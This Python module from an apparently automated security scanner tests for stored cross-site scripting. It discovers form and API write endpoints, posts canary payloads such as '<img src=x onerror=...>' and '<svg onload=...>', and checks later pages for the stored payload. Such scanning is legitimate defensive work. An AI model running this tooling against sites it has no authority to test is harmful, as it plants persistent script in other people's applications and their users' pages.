"""
Stored XSS detection - tests for persistent XSS via form submissions.

I/O layer that:
1. Discovers POST targets (HTML forms + common API write endpoints)
2. Submits XSS payloads via POST (form-encoded AND JSON)
3. Extracts resource ID from POST response
4. Builds detail URLs and checks for stored payload
5. Checks canary in raw text, JSON values, and HTML responses

Extracted from xss_agent.py (lines 3845-4203).
"""

import re
import time
from typing import Dict, List, Optional, Any
from urllib.parse import urlparse, urljoin

import aiohttp

from bugtrace.utils.logger import get_logger
from bugtrace.core.ui import dashboard
from bugtrace.core.http_manager import http_manager, ConnectionProfile

logger = get_logger("agents.xss.stored")


# ---------------------------------------------------------------------------
# PURE FUNCTIONS
# ---------------------------------------------------------------------------

def extract_resource_id(response_text: str) -> Optional[str]:
    """
    Extract resource ID from a POST response (JSON or headers).

    Searches for common ID field names in JSON responses, and falls back
    to regex extraction of numeric IDs.

    Args:
        response_text: Raw HTTP response body text.

    Returns:
        Resource ID as string, or None if not found.
    """
    import json as json_module

    try:
        data = json_module.loads(response_text)
        # Top-level ID
        if isinstance(data, dict):
            for key in ("id", "ID", "_id", "review_id", "thread_id", "post_id", "comment_id"):
                if key in data:
                    return str(data[key])
            # Nested data.id
            if "data" in data and isinstance(data["data"], dict) and "id" in data["data"]:
                return str(data["data"]["id"])
    except Exception:
        pass
    # Fallback: extract numeric ID from response
    match = re.search(r'"id"\s*:\s*(\d+)', response_text)
    if match:
        return match.group(1)
    return None


def check_stored_canary(body: str, canary: str, payload: str) -> bool:
    """
    Check if XSS canary exists in response across multiple formats.

    Checks:
    - Raw payload present (HTML context)
    - Canary in event handler context (unescaped)
    - JSON-escaped payload
    - Canary present with onerror/onload handlers

    Args:
        body: HTTP response body to search.
        canary: The unique canary string (e.g., "BTXSS1234").
        payload: The original XSS payload submitted.

    Returns:
        True if the canary/payload is found in a stored context.
    """
    if canary not in body:
        return False

    # Raw payload present (HTML context)
    if payload in body:
        return True

    # Canary in event handler context (unescaped)
    if f"onerror=document.title='{canary}'" in body or f"onload=document.title='{canary}'" in body:
        return True

    # JSON-escaped payload (e.g., inside {"comment": "<img src=x onerror=...>"})
    json_escaped = payload.replace('"', '\\"')
    if json_escaped in body:
        return True

    # Canary present but payload partially encoded -- still a stored XSS
    # if the canary survives, the payload was stored (even if rendered differently)
    if "onerror=" in body and canary in body:
        return True
    if "onload=" in body and canary in body:
        return True

    return False


def build_stored_finding(
    url: str,
    parameter: str,
    payload: str,
    post_url: str,
    check_url: str,
    validation_method: str,
    resource_id: Optional[str] = None,
) -> Dict:
    """
    Build a stored XSS finding dict.

    Args:
        url: URL where the stored XSS is rendered.
        parameter: The POST parameter that was injected.
        payload: The XSS payload.
        post_url: URL where the payload was submitted.
        check_url: URL where the payload was retrieved/verified.
        validation_method: How the stored XSS was confirmed.
        resource_id: Optional resource ID from POST response.

    Returns:
        Finding dict in standard format.
    """
    return {
        "type": "XSS",
        "subtype": "STORED_XSS",
        "url": url,
        "parameter": parameter,
        "payload": payload,
        "context": "stored_xss",
        "evidence": {
            "validated": True,
            "level": "stored",
            "post_url": post_url,
            "check_url": check_url,
            "xss_type": "stored",
            "validation_method": validation_method,
            "resource_id": resource_id,
        },
        "confidence": 0.95,
        "validated": True,
        "status": "VALIDATED_CONFIRMED",
        "http_method": "POST",
    }


# ---------------------------------------------------------------------------
# I/O FUNCTIONS
# ---------------------------------------------------------------------------

async def _discover_form_targets(
    browser_manager,
    url: str,
) -> List[Dict]:
    """
    Discover POST targets from HTML forms on the page.

    Args:
        browser_manager: Browser manager with capture_state() method.
        url: URL to scrape for forms.

    Returns:
        List of target dicts with keys: url, fields, text_fields, format.
    """
    from bs4 import BeautifulSoup

    targets = []

    try:
        state = await browser_manager.capture_state(url)
        html = state.get("html", "")
    except Exception:
        html = ""

    if not html:
        return targets

    soup = BeautifulSoup(html, "html.parser")
    for form in soup.find_all("form"):
        method = (form.get("method", "GET") or "GET").upper()
        if method != "POST":
            continue
        action = form.get("action", "")
        form_url = urljoin(url, action) if action else url

        fields = {}
        text_fields = []
        for inp in form.find_all(["input", "textarea", "select"]):
            name = inp.get("name")
            if not name:
                continue
            input_type = (inp.get("type", "text") or "text").lower()
            if input_type in ("submit", "button", "reset", "file", "image"):
                continue
            default = inp.get("value", "")
            fields[name] = default
            if input_type in ("text", "search", "url", "email") or inp.name == "textarea":
                text_fields.append(name)
            elif input_type == "hidden" and "csrf" not in name.lower() and "token" not in name.lower():
                text_fields.append(name)

        if text_fields and fields:
            targets.append({
                "url": form_url,
                "fields": fields,
                "text_fields": text_fields,
                "format": "form",
            })

    return targets


def _discover_api_targets_from_recon(
    urls_to_scan: List[str],
    existing_urls: set,
) -> List[Dict]:
    """
    Discover API write endpoints from recon URLs.

    Matches URLs against common API write patterns (reviews, comments, forum, etc.).

    Args:
        urls_to_scan: All recon URLs to check.
        existing_urls: Set of already-discovered target URLs (to avoid duplicates).

    Returns:
        List of new API target dicts.
    """
    content_field_names = [
        "comment", "content", "body", "text", "message",
        "description", "title", "review", "feedback", "post"
    ]
    api_write_patterns = [
        (r'/api/reviews', {"comment": "", "rating": "5", "product_id": "1"}),
        (r'/api/comments', {"comment": "", "post_id": "1"}),
        (r'/api/forum/threads', {"title": "test", "content": ""}),
        (r'/api/forum/replies', {"content": "", "thread_id": "1"}),
        (r'/api/blog/posts', {"title": "test", "content": ""}),
        (r'/api/blog/comments', {"comment": "", "blog_id": "1"}),
        (r'/api/posts', {"content": "", "title": "test"}),
        (r'/api/feedback', {"comment": "", "rating": "5"}),
    ]

    targets = []
    for url_candidate in urls_to_scan:
        for pattern, default_fields in api_write_patterns:
            if re.search(pattern, url_candidate, re.IGNORECASE):
                api_url = url_candidate.split("?")[0]
                if api_url not in existing_urls:
                    text_flds = [k for k in default_fields if k in content_field_names]
                    if text_flds:
                        targets.append({
                            "url": api_url,
                            "fields": default_fields,
                            "text_fields": text_flds,
                            "format": "json",
                        })
                        existing_urls.add(api_url)
    return targets


async def _probe_common_api_endpoints(
    base_url: str,
    existing_urls: set,
    auth_headers: Dict[str, str],
) -> List[Dict]:
    """
    Probe common API write endpoints on the target.

    Tries POST with dummy data against known patterns, looking for
    200/201/400/422 responses that indicate the endpoint accepts POST.

    Args:
        base_url: Base URL (scheme://host) of the target.
        existing_urls: Set of already-discovered target URLs.
        auth_headers: Authentication headers to include.

    Returns:
        List of new API target dicts.
    """
    targets = []
    common_api_paths = [
        "/api/reviews", "/api/comments", "/api/forum/threads",
        "/api/blog/posts", "/api/forum/replies"
    ]

    for api_path in common_api_paths:
        for suffix in ["", "/"]:
            api_url = f"{base_url}{api_path}{suffix}"
            api_url_canonical = f"{base_url}{api_path}"
            if api_url_canonical in existing_urls:
                break
            try:
                async with http_manager.session(ConnectionProfile.PROBE) as session:
                    async with session.post(
                        api_url, json={"test": "probe"}, ssl=False,
                        headers={**auth_headers, "Content-Type": "application/json"},
                        timeout=aiohttp.ClientTimeout(total=3)
                    ) as resp:
                        if resp.status in (200, 201, 400, 422):
                            text_flds = ["comment", "content"]
                            default_fields = {
                                "comment": "", "content": "", "rating": 5,
                                "product_id": 1, "post_id": 1, "thread_id": 1,
                                "blog_id": 1, "item_id": 1,
                            }
                            # Parse 422 validation errors for required field hints
                            if resp.status == 422:
                                try:
                                    err_data = await resp.json()
                                    for detail in err_data.get("detail", []):
                                        loc = detail.get("loc", [])
                                        if len(loc) >= 2:
                                            field_name = loc[-1]
                                            if field_name not in default_fields:
                                                default_fields[field_name] = "1"
                                except Exception:
                                    pass
                            targets.append({
                                "url": api_url,
                                "fields": default_fields,
                                "text_fields": text_flds,
                                "format": "json",
                            })
                            existing_urls.add(api_url_canonical)
                            break
            except Exception:
                pass

    return targets


async def test_stored_xss(
    browser_manager,
    url: str,
    urls_to_scan: Optional[List[str]] = None,
    scan_context=None,
    agent_name: str = "XSS",
    screenshots_dir: Optional[str] = None,
) -> List[Dict]:
    """
    Test for stored XSS by submitting payloads via POST then checking GET pages.

    Enhanced workflow:
    1. Discover POST targets: HTML forms + common API write endpoints
    2. Submit XSS payloads via POST (form-encoded AND JSON)
    3. Extract resource ID from POST response
    4. Build detail URLs (e.g., /api/reviews/{id}) and check for stored payload
    5. Check canary in raw text, JSON values, and HTML responses

    Args:
        browser_manager: Browser manager for page state capture.
        url: Primary target URL.
        urls_to_scan: Additional URLs to scan for API patterns.
        scan_context: Optional scan context for auth header extraction.
        agent_name: Agent name for logging.
        screenshots_dir: Optional directory for screenshots.

    Returns:
        List of stored XSS finding dicts.
    """
    findings: List[Dict] = []
    canary = f"BTXSS{int(time.time()) % 10000}"
    stored_payloads = [
        f"<img src=x onerror=document.title='{canary}'>",
        f"<svg onload=document.title='{canary}'>",
        f'"><img src=x onerror=document.title=\'{canary}\'>',
    ]

    parsed_url = urlparse(url)
    base = f"{parsed_url.scheme}://{parsed_url.netloc}"

    # Get auth headers for authenticated write endpoints
    auth_headers: Dict[str, str] = {}
    try:
        from bugtrace.services.scan_context import get_scan_auth_headers
        auth_headers = get_scan_auth_headers(scan_context, role="user") or {}
    except Exception:
        pass

    # ========== Phase A: Discover POST targets ==========
    post_targets: List[Dict] = []

    # A1: HTML form discovery
    form_targets = await _discover_form_targets(browser_manager, url)
    post_targets.extend(form_targets)

    # A2: API write endpoint discovery from recon URLs
    discovered_api_urls = set(t["url"] for t in post_targets)
    if urls_to_scan:
        api_targets = _discover_api_targets_from_recon(urls_to_scan, discovered_api_urls)
        post_targets.extend(api_targets)

    # A3: Probe common API write endpoints on the target
    probe_targets = await _probe_common_api_endpoints(base, discovered_api_urls, auth_headers)
    post_targets.extend(probe_targets)

    if not post_targets:
        return findings

    logger.info(f"[{agent_name}] Stored XSS: {len(post_targets)} POST targets "
                f"({sum(1 for t in post_targets if t['format'] == 'form')} forms, "
                f"{sum(1 for t in post_targets if t['format'] == 'json')} API)")

    # ========== Phase B: Write-then-Read testing ==========
    for target in post_targets[:8]:
        form_url = target["url"]
        fields = target["fields"]
        text_fields = target["text_fields"]
        fmt = target["format"]
        target_auth_failed = False

        for target_field in text_fields[:2]:
            if target_auth_failed:
                break
            for payload in stored_payloads:
                try:
                    submit_data = dict(fields)
                    submit_data[target_field] = payload
                    post_response_text = ""
                    post_status = 0

                    # Submit payload
                    async with http_manager.session(ConnectionProfile.PROBE) as session:
                        req_headers = {
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                            **auth_headers,
                        }
                        if fmt == "json":
                            req_headers["Content-Type"] = "application/json"
                            async with session.post(
                                form_url, json=submit_data, ssl=False,
                                headers=req_headers,
                                allow_redirects=True,
                                timeout=aiohttp.ClientTimeout(total=8)
                            ) as resp:
                                post_status = resp.status
                                post_response_text = await resp.text()
                        else:
                            async with session.post(
                                form_url, data=submit_data, ssl=False,
                                headers=req_headers,
                                allow_redirects=True,
                                timeout=aiohttp.ClientTimeout(total=8)
                            ) as resp:
                                post_status = resp.status
                                post_response_text = await resp.text()

                    # Log POST result for debugging
                    logger.info(f"[{agent_name}] Stored XSS POST {form_url} field={target_field}: HTTP {post_status}")

                    # Skip auth-gated endpoints we can't access
                    if post_status in (401, 403):
                        logger.info(f"[{agent_name}] Stored XSS: auth required for POST {form_url} (HTTP {post_status})")
                        target_auth_failed = True
                        break
                    if post_status >= 500:
                        continue

                    # Check 1: POST response itself may contain the stored payload
                    if post_status in (200, 201) and check_stored_canary(post_response_text, canary, payload):
                        findings.append(build_stored_finding(
                            url=form_url,
                            parameter=target_field,
                            payload=payload,
                            post_url=form_url,
                            check_url=form_url,
                            validation_method="post_response_reflection",
                            resource_id=extract_resource_id(post_response_text),
                        ))
                        logger.info(f"[{agent_name}] STORED XSS CONFIRMED: payload reflected in POST response at {form_url}")
                        break

                    # Build check URLs: original page + form URL + detail URL from response
                    check_urls = [url]
                    if form_url != url:
                        check_urls.append(form_url)

                    # Extract resource ID from POST response to build detail URL
                    resource_id = extract_resource_id(post_response_text)
                    if resource_id:
                        detail_url = f"{form_url.rstrip('/')}/{resource_id}"
                        check_urls.append(detail_url)

                    # Also check the list endpoint (payload may render on list page)
                    list_url = form_url.rstrip("/")
                    if list_url not in check_urls:
                        check_urls.append(list_url)

                    # Check each URL for stored payload
                    for check_url in check_urls:
                        try:
                            async with http_manager.session(ConnectionProfile.PROBE) as session:
                                async with session.get(
                                    check_url, ssl=False,
                                    headers={**auth_headers},
                                    timeout=aiohttp.ClientTimeout(total=5)
                                ) as resp:
                                    body = await resp.text()
                        except Exception:
                            continue

                        # Check for canary in response (multiple formats)
                        if check_stored_canary(body, canary, payload):
                            findings.append(build_stored_finding(
                                url=check_url,
                                parameter=target_field,
                                payload=payload,
                                post_url=form_url,
                                check_url=check_url,
                                validation_method="http_response_analysis",
                                resource_id=resource_id,
                            ))
                            logger.info(f"[{agent_name}] STORED XSS CONFIRMED: POST {form_url} field '{target_field}' -> stored on GET {check_url}")
                            break
                    if findings and findings[-1].get("parameter") == target_field:
                        break
                except Exception as e:
                    logger.debug(f"[{agent_name}] Stored XSS test failed: {e}")
                    continue

    return findings


__all__ = [
    # Pure
    "extract_resource_id",
    "check_stored_canary",
    "build_stored_finding",
    # I/O
    "test_stored_xss",
]
